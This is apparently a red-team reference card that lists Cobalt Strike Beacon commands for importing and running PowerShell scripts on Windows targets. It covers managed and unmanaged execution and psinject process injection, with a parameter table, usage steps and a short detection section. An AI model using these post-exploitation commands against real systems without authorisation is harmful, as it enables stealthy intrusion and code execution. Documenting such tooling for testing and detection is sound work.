---
id: 494fd1b3-ec18-48cb-b042-48c8c6ab019b
name: cobalt-strike-powershell-execution-snippet
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:16.489430+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - cobalt-strike
  - powershell
  - execution
validated: true
---

# Cobalt Strike PowerShell Execution Snippet

## Code

```bash
# Import a Powershell .ps1 script from the control server and save it in memory in Beacon
beacon > powershell-import [/path/to/script.ps1]

# Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned.
beacon > powershell [commandlet][arguments]

# Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto
beacon > powerpick [commandlet] [argument]

# Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs
beacon > psinject [pid][arch] [commandlet] [arguments]
```

## Description

This snippet provides example Beacon console commands for handling PowerShell script execution in Cobalt Strike. It covers import, managed execution, unmanaged launch, and process injection, serving as a quick reference for red team operators to perform stealthy script-based operations on Windows targets.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `/path/to/script.ps1` | Path to the script on the team server | `/scripts/malicious.ps1` |
| `[commandlet]` | Function or cmdlet name | `Get-Process` |
| `[arguments]` | Parameters for the function | `-Name explorer` |
| `[pid]` | Target process ID | `1234` |
| `[arch]` | Process architecture | `x64` |

## Usage

Paste these into an active Beacon console during a session. First import a script, then execute via `powershell` or `powerpick` for quick tasks, or `psinject` for persistent injection. Requires prior Beacon implantation and team server setup.

## Detection

- Monitor for Beacon C2 traffic patterns (HTTPS/SMB beacons).
- Enable PowerShell logging for script block execution and module loads.
- Detect process injections via ETW or EDR tools scanning for CLR loads in non-PowerShell processes.
- Network anomalies: Localhost TCP connections during managed execution.

## Related

- [[procedures/powershell-script-execution-with-cobalt-strike]]
- [[tools/Cobalt-Strike]]
